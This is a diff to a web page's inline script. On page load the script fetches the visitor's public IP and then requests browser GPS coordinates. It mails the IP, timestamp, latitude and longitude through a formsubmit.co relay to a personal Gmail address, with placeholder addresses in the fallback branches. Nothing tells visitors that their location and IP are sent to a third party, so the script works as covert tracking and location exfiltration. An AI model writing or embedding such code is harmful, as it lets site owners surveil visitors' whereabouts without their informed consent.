@@ -1,22 +1,58 @@
 <script>
+  // Get IP address
   fetch("https://api.ipify.org?format=json")
     .then((response) => response.json())
     .then((data) => {
+      const ipAddress = data.ip;
       const currentTime = new Date().toLocaleString();
 
-      fetch("https://formsubmit.co/ajax/theafricannovella@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json"
-        },
-        body: JSON.stringify({
-          message: `Visitor IP: ${data.ip} at ${currentTime}`
-        })
-      })
-      .then(res => res.json())
-      .then(result => console.log("IP sent:", result))
-      .catch(error => console.error("Error:", error));
+      // Now ask for GPS location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Send all info to email
+            fetch("https://formsubmit.co/ajax/theafricannovella@gmail.com", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                Accept: "application/json"
+              },
+              body: JSON.stringify({
+                message: `IP: ${ipAddress}\nTime: ${currentTime}\nLatitude: ${latitude}\nLongitude: ${longitude}`
+              })
+            });
+          },
+          (error) => {
+            // If user denies GPS or it fails
+            fetch("https://formsubmit.co/ajax/YOUR_EMAIL@gmail.com", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                Accept: "application/json"
+              },
+              body: JSON.stringify({
+                message: `IP: ${ipAddress}\nTime: ${currentTime}\nGPS: Denied or Unavailable`
+              })
+            });
+          }
+        );
+      } else {
+        // GPS not supported
+        fetch("https://formsubmit.co/ajax/YOUR_EMAIL@gmail.com", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Accept: "application/json"
+          },
+          body: JSON.stringify({
+            message: `IP: ${ipAddress}\nTime: ${currentTime}\nGPS: Not Supported`
+          })
+        });
+      }
     });
 </script>
+
 
